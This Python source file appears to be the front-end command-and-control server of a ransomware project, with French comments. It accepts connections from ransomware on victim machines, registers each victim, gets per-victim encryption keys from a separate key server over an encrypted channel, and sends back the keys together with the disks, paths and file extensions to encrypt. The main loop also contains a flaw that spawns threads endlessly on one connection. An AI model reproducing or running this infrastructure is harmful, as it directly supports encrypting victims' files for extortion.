import string
import random
import utile.network as network
import utile.message as message
import utile.security as security
import utile.config as config
import queue
from threading import Thread

load = config.load_config('../configuration/config/serveur_frontal.cfg', '../configuration/config/serveur_frontal.key')
PORT = 8381
PORT_RANSOMWARE = 8443
CONFIG_SERVEUR = config.load_config('../configuration/config/serveur.cfg', '../configuration/config/serveur.key')
CONFIG_WORKSTATION = config.load_config('../configuration/config/workstation.cfg','../configuration/config/workstation.key')
status_victims = {}

def simulate_hash(longueur=0):
    letters = string.hexdigits
    return ''.join(random.choice(letters) for i in range(longueur))


def main():
    q_messages_receiv = queue.Queue()  # Queue FIFO réceptionnant toutes les demandes venant des ransomware

    # Démarrage du Thread de communication avec le serveur de clés
    t_srv_cles = Thread(target=thread_srv_cles, args=(q_messages_receiv,), daemon=True)
    t_srv_cles.start()

    q_messages_receiv.get()  # Attend que le serveur frontal soit connecté au serveur de clés
    print("[Serveur frontal] - Serveur de clés connecté.")
    q_messages_receiv.task_done()  # Libère le thread srv clés
    s_serveur = network.start_net_serv(port=PORT_RANSOMWARE)
    print("OK")
    conn_victim, address_victim = s_serveur.accept()
    print(f"[Serveur frontal] : Connexion d'un ransomware {address_victim} a été établie.")
    while True:
        q_response_victim = queue.Queue()  # Queue FIFO réponse victime
        # Démarrage du Thread de communication avec le ransomware
        t_victims = Thread(target=thread_ransomware, args=(conn_victim,q_messages_receiv, q_response_victim,),daemon=True)
        t_victims.start()
def thread_srv_cles(q_messages_receiv):
    # Connection vers le serveur de clés
    s_srv_cles = network.connect_to_serv(port=PORT, retry=60)

    # Réception la clé de chiffrement lors de la connexion via Diffie Hellman receive Key
    aes_key = security.diffie_hellman_recv_key(s_srv_cles)
    print(f"Clé de chiffrement réceptionnée : {aes_key} {type(aes_key)}")

    # Utilise la queue FIFO q_messages_receiv pour valider la connexion au serveur de cles
    q_messages_receiv.put('SERVEUR_CLE_CONNECTED')
    q_messages_receiv.join()  # Attend que le main lance l'écoute des ransomwares

    while True:
        msg = q_messages_receiv.get()  # Réceptionne les msg en queue reçu des ransomware

        # Retire la queue FIFO du ransomware où envoyer la réponse
        if 'queue' in msg.keys():
            queue_response = msg['queue']
            msg.pop('queue')  # Retire la clé 'queue' du dictionnaire msg

        msg_type = message.get_message_type(msg)

        if msg_type == 'INITIALIZE_REQ':
            msg = security.aes_encrypt(msg, aes_key)
            network.send_message(s_srv_cles, msg)

            # Réception de la réponse
            msg = network.receive_message(s_srv_cles)
            msg = security.aes_decrypt(msg, aes_key)
            msg_type = message.get_message_type(msg)
            if msg_type == 'INITIALIZE_KEY':
                print(f"L'ID de la nouvelle victime est : {msg['KEY_RESP']}")
                print(f"Son dernier état connu en DB est : {msg['STATE']}")
                print(f"Sa clé de chiffrement est :")
                print(f"{msg['KEY']}")
                queue_response.put(msg)


def thread_ransomware(conn_victim,q_messages_receiv, q_response_victim):
    while True:
        msg = network.receive_message(conn_victim)
        if msg is None:  # La connexion a été fermée
            break
        else:
            msg_type = message.get_message_type(msg)
            # Si le message reçu est un list_victim_req
            if msg_type == 'INITIALIZE_REQ':
                if msg['INITIALIZE'] in status_victims.keys():
                    print(f"{msg['INITIALIZE']}")
                else:
                    status_victims[msg['INITIALIZE']] = 'INITIALIZE'
                    print("status victims : " + str(status_victims))
                msg['queue'] = q_response_victim    # Ajout de la queue de réponse au msg
                q_messages_receiv.put(msg)          # Envoi du msg en queue
                key_resp = q_response_victim.get()  # Réception du msg venant du serveur de clés
                if msg['OS'] == 'SERVEUR':
                    config_ransomware = CONFIG_SERVEUR
                else:
                    config_ransomware = CONFIG_WORKSTATION
                # params ==> 0 = id, 1 = disks, 2 = paths, 3 = file_ext, 4 =freq, 5 = key
                msg = message.set_message('initialize_resp', [key_resp['KEY_RESP'],config_ransomware['DISKS'],config_ransomware['PATHS'], config_ransomware['FILE_EXT'],config_ransomware['FREQ'],key_resp['KEY']])
                network.send_message(conn_victim, msg)
                print("Message envoyé a la victime : " + str(msg))


if __name__ == '__main__':
    main()